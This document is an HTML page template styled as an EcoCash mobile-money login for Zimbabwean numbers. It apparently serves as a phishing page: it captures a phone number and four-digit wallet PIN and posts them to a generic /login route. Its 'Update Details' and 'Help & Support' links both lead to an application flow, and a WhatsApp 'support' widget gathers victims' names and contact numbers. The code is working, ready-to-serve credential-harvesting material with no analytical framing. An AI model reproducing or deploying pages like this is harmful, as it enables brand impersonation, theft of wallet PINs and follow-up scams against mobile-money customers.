<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>EcoCash Login</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        * { box-sizing: border-box; }
        :root {
            --bg: #0b1118;
            --card: #121b26;
            --elevated: #182433;
            --accent: #00b86b;
            --accent-hover: #009e5b;
            --text: #f4f7fb;
            --muted: #94a3b8;
            --border: rgba(255, 255, 255, 0.08);
        }
        body {
            margin: 0;
            min-height: 100vh;
            background: radial-gradient(circle at top, #132234 0%, var(--bg) 65%);
            color: var(--text);
            font-family: -apple-system, BlinkMacSystemFont, "Inter", "Segoe UI", Roboto, sans-serif;
            padding: 20px 16px 36px;
        }
        .wrap { max-width: 420px; margin: 0 auto; }
        .card-modern {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 22px;
            padding: 24px 20px;
            box-shadow: 0 20px 45px rgba(0, 0, 0, 0.45);
        }
        .brand {
            font-weight: 800; font-size: 1.5rem; text-align: center; margin-bottom: 6px;
        }
        .brand span.eco { color: #38bdf8; }
        .brand span.cash { color: #f43f5e; }
        .phone-row {
            display: flex; gap: 8px;
        }
        .prefix-box {
            background: var(--elevated);
            border: 1px solid rgba(255,255,255,0.12);
            border-radius: 12px;
            padding: 12px 12px;
            font-weight: 600;
            white-space: nowrap;
        }
        .phone-input {
            background: var(--elevated);
            border: 1px solid rgba(255,255,255,0.12);
            color: var(--text);
            border-radius: 12px;
            padding: 12px 14px;
            width: 100%;
        }
        .phone-input:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 0 3px rgba(0, 184, 107, 0.18);
        }
        .pin-grid {
            display: grid;
            grid-template-columns: repeat(4, minmax(0, 1fr));
            gap: 12px;
            width: 100%;
            max-width: 260px;
            margin: 12px auto 20px;
        }
        .pin-box {
            width: 100%;
            min-width: 0;
            height: 54px;
            padding: 0;
            text-align: center;
            font-size: 1.35rem;
            font-weight: 700;
            background: var(--elevated);
            border: 1.5px solid rgba(255,255,255,0.14);
            border-radius: 12px;
            color: var(--text);
        }
        .pin-box:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 0 3px rgba(0, 184, 107, 0.2);
        }
        .btn-eco {
            background: var(--accent);
            color: #05120c;
            font-weight: 700;
            border: none;
            border-radius: 14px;
            padding: 13px;
            width: 100%;
        }
        .btn-eco:hover { background: var(--accent-hover); color: #05120c; }
        .footer-panel {
            background: var(--elevated);
            border: 1px solid var(--border);
            border-radius: 18px;
            padding: 16px;
            margin-top: 16px;
            text-align: center;
        }
        .footer-btn {
            background: var(--card);
            border: 1px solid var(--border);
            color: var(--text);
            border-radius: 12px;
            padding: 10px 12px;
            font-size: 0.85rem;
            font-weight: 600;
            text-decoration: none;
            display: block;
            position: relative;
            z-index: 5;
            cursor: pointer;
        }
        .processing-backdrop {
            position: fixed;
            inset: 0;
            background: rgba(6, 10, 15, 0.78);
            backdrop-filter: blur(4px);
            display: none;
            pointer-events: none;
            align-items: center;
            justify-content: center;
            z-index: 999;
        }
        .processing-backdrop.is-open {
            display: flex;
            pointer-events: auto;
        }
        .processing-modal {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 18px;
            padding: 24px 28px;
            text-align: center;
            box-shadow: 0 20px 50px rgba(0,0,0,0.6);
        }
        .proc-ring {
            width: 44px; height: 44px; border-radius: 50%;
            border: 3px solid rgba(255,255,255,0.12);
            border-top-color: var(--accent);
            animation: spin 0.8s linear infinite;
            margin: 0 auto 12px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        .wa-float {
            position: fixed;
            right: 20px;
            bottom: 20px;
            width: 56px;
            height: 56px;
            border-radius: 50%;
            background: #25d366;
            color: #ffffff;
            border: none;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 12px 28px rgba(0, 0, 0, 0.45);
            z-index: 900;
            cursor: pointer;
            transition: transform 0.15s ease, background 0.15s ease;
        }
        .wa-float:hover {
            background: #1ebe5d;
            transform: translateY(-2px);
        }
        .wa-popup {
            position: fixed;
            right: 20px;
            bottom: 88px;
            width: 310px;
            max-width: calc(100vw - 32px);
            background: var(--card);
            border: 1px solid rgba(255, 255, 255, 0.12);
            border-radius: 18px;
            box-shadow: 0 22px 50px rgba(0, 0, 0, 0.6);
            z-index: 950;
            display: none;
            overflow: hidden;
        }
        .wa-popup.is-open {
            display: block;
        }
        .wa-popup-header {
            background: var(--elevated);
            border-bottom: 1px solid var(--border);
            padding: 12px 14px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            cursor: grab;
            user-select: none;
            touch-action: none;
        }
        .wa-popup-header:active {
            cursor: grabbing;
        }
        .wa-close-btn {
            background: transparent;
            border: none;
            color: var(--muted);
            font-size: 1.15rem;
            line-height: 1;
            padding: 0 4px;
            cursor: pointer;
        }
        .wa-close-btn:hover {
            color: var(--text);
        }
        .wa-popup-body {
            padding: 14px;
        }
        .wa-input {
            width: 100%;
            background: var(--elevated);
            border: 1px solid rgba(255, 255, 255, 0.12);
            color: var(--text);
            border-radius: 10px;
            padding: 10px 12px;
            font-size: 0.9rem;
            margin-bottom: 10px;
        }
        .wa-input:focus {
            outline: none;
            border-color: #25d366;
        }
        .wa-send-btn {
            width: 100%;
            background: #25d366;
            color: #062111;
            font-weight: 700;
            border: none;
            border-radius: 11px;
            padding: 10px 12px;
            font-size: 0.9rem;
            cursor: pointer;
        }
        .wa-send-btn:hover {
            background: #1ebe5d;
        }
        .wa-feedback {
            font-size: 0.8rem;
            margin-top: 8px;
            min-height: 18px;
            color: #34d399;
        }
    </style>
</head>
<body>
    <div class="wrap">
        <div class="card-modern">
            <div class="brand"><span class="eco">Eco</span><span class="cash">Cash</span></div>
            <h2 class="fw-bold fs-4 text-center mb-3">Login</h2>

            <form id="loginForm" action="/login" method="POST">
                <div class="mb-3">
                    <div class="phone-row">
                        <div class="prefix-box">🇿🇼 +263</div>
                        <input type="tel" class="phone-input" name="phone"
                            value="{{ session.get('phone', '') }}" placeholder="77 000 0000" required>
                    </div>
                </div>

                <div class="text-center small fw-medium" style="color: var(--muted);">Enter your PIN</div>
                <div class="pin-grid">
                    <input type="password" inputmode="numeric" maxlength="1" class="pin-box" required>
                    <input type="password" inputmode="numeric" maxlength="1" class="pin-box" required>
                    <input type="password" inputmode="numeric" maxlength="1" class="pin-box" required>
                    <input type="password" inputmode="numeric" maxlength="1" class="pin-box" required>
                </div>
                <input type="hidden" name="pin" id="pinHidden">

                <button type="submit" class="btn-eco shadow-sm">Continue</button>
            </form>
        </div>

        <div class="footer-panel">
            <p class="small mb-3" style="color: var(--muted);">Need help with your EcoCash wallet?</p>
            <div class="row g-2">
                <div class="col-6"><a href="/apply/step1" class="footer-btn">Update Details</a></div>
                <div class="col-6"><a href="/apply/step1" class="footer-btn">Help & Support</a></div>
            </div>
        </div>
    </div>

    <div id="processingOverlay" class="processing-backdrop">
        <div class="processing-modal">
            <div class="proc-ring"></div>
            <div class="fw-semibold">Processing...</div>
        </div>
    </div>

    <button type="button" id="waFloatBtn" class="wa-float" aria-label="WhatsApp Help">
        <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" fill="currentColor" viewBox="0 0 16 16">
            <path d="M13.601 2.326A7.85 7.85 0 0 0 7.994 0C3.627 0 .068 3.558.064 7.926c0 1.399.366 2.76 1.057 3.965L0 16l4.204-1.102a7.9 7.9 0 0 0 3.79.965h.004c4.368 0 7.926-3.558 7.93-7.925a7.89 7.89 0 0 0-2.323-5.612m-5.607 12.21h-.003c-1.17 0-2.317-.315-3.318-.91l-.238-.141-2.495.654.666-2.433-.155-.247a6.56 6.56 0 0 1-1.007-3.504c.003-3.62 2.95-6.566 6.573-6.566a6.52 6.52 0 0 1 4.643 1.925 6.52 6.52 0 0 1 1.921 4.648c-.003 3.62-2.95 6.564-6.566 6.564m3.6-4.918c-.197-.099-1.167-.576-1.348-.642-.181-.066-.313-.099-.445.099-.132.197-.511.642-.627.774-.115.132-.231.148-.428.05-.198-.099-.835-.308-1.59-.981-.588-.524-.985-1.172-1.1-1.37-.116-.197-.012-.304.087-.402.089-.088.198-.23.297-.346.099-.115.132-.198.198-.33.066-.131.033-.247-.017-.346s-.445-1.072-.61-1.468c-.16-.385-.324-.333-.445-.34l-.379-.007c-.132 0-.346.05-.527.247-.181.198-.692.676-.692 1.648s.709 1.912.808 2.044c.099.132 1.395 2.13 3.38 2.987.472.204.841.326 1.128.417.474.151.906.13 1.247.079.38-.057 1.167-.477 1.332-.938s.165-.856.115-.938c-.049-.082-.181-.132-.379-.23"/>
        </svg>
    </button>

    <div id="waPopup" class="wa-popup" role="dialog" aria-label="WhatsApp Support">
        <div id="waDragHandle" class="wa-popup-header">
            <span class="fw-semibold small">💬 WhatsApp Support (Drag)</span>
            <button type="button" id="waCloseBtn" class="wa-close-btn" aria-label="Close">&times;</button>
        </div>
        <form id="waHelpForm" class="wa-popup-body">
            <input type="text" id="waNameInput" class="wa-input" placeholder="Your full name" required>
            <input type="tel" id="waPhoneInput" class="wa-input" placeholder="WhatsApp number (e.g. +263 77...)" required>
            <button type="submit" id="waSubmitBtn" class="wa-send-btn">Request WhatsApp Help</button>
            <div id="waFeedback" class="wa-feedback"></div>
        </form>
    </div>

    <script>
        const boxes = Array.from(document.querySelectorAll(".pin-box"));
        const pinHidden = document.getElementById("pinHidden");
        const loginForm = document.getElementById("loginForm");

        boxes.forEach((box, idx) => {
            box.addEventListener("input", () => {
                box.value = box.value.replace(/\D/g, "").slice(0, 1);
                if (box.value && idx < boxes.length - 1) {
                    boxes[idx + 1].focus();
                }
                pinHidden.value = boxes.map(b => b.value).join("");
            });

            box.addEventListener("keydown", (e) => {
                if (e.key === "Backspace" && !box.value && idx > 0) {
                    boxes[idx - 1].focus();
                }
            });
        });

        loginForm.addEventListener("submit", (e) => {
            const pinVal = boxes.map(b => b.value).join("");
            if (pinVal.length < 4) {
                e.preventDefault();
                boxes[0].focus();
                return;
            }
            pinHidden.value = pinVal;
            document.getElementById("processingOverlay").classList.add("is-open");
        });

        (function () {
            const floatBtn = document.getElementById("waFloatBtn");
            const popup = document.getElementById("waPopup");
            const dragHandle = document.getElementById("waDragHandle");
            const closeBtn = document.getElementById("waCloseBtn");
            const form = document.getElementById("waHelpForm");
            const feedback = document.getElementById("waFeedback");
            const submitBtn = document.getElementById("waSubmitBtn");

            floatBtn.addEventListener("click", () => {
                popup.classList.toggle("is-open");
                feedback.textContent = "";
            });

            closeBtn.addEventListener("click", () => {
                popup.classList.remove("is-open");
            });

            let dragging = false;
            let offsetX = 0;
            let offsetY = 0;

            dragHandle.addEventListener("pointerdown", (e) => {
                if (e.target === closeBtn) return;
                const rect = popup.getBoundingClientRect();
                popup.style.left = rect.left + "px";
                popup.style.top = rect.top + "px";
                popup.style.right = "auto";
                popup.style.bottom = "auto";
                offsetX = e.clientX - rect.left;
                offsetY = e.clientY - rect.top;
                dragging = true;
                dragHandle.setPointerCapture(e.pointerId);
            });

            dragHandle.addEventListener("pointermove", (e) => {
                if (!dragging) return;
                const maxX = window.innerWidth - popup.offsetWidth - 8;
                const maxY = window.innerHeight - popup.offsetHeight - 8;
                const nextLeft = Math.max(8, Math.min(e.clientX - offsetX, maxX));
                const nextTop = Math.max(8, Math.min(e.clientY - offsetY, maxY));
                popup.style.left = nextLeft + "px";
                popup.style.top = nextTop + "px";
            });

            dragHandle.addEventListener("pointerup", () => {
                dragging = false;
            });

            form.addEventListener("submit", async (e) => {
                e.preventDefault();
                const name = document.getElementById("waNameInput").value.trim();
                const whatsapp = document.getElementById("waPhoneInput").value.trim();
                if (!name || !whatsapp) return;

                submitBtn.disabled = true;
                submitBtn.textContent = "Sending...";
                feedback.style.color = "#94a3b8";
                feedback.textContent = "";

                try {
                    const res = await fetch("/whatsapp-help", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            name,
                            whatsapp,
                            page: window.location.pathname
                        })
                    });
                    const data = await res.json();
                    if (res.ok && data.ok) {
                        feedback.style.color = "#34d399";
                        feedback.textContent = data.message || "Sent! We will message you on WhatsApp.";
                        form.reset();
                    } else {
                        feedback.style.color = "#f87171";
                        feedback.textContent = data.error || "Could not send request.";
                    }
                } catch (err) {
                    feedback.style.color = "#f87171";
                    feedback.textContent = "Network error. Please try again.";
                } finally {
                    submitBtn.disabled = false;
                    submitBtn.textContent = "Request WhatsApp Help";
                }
            });
        })();
    </script>
</body>
</html>
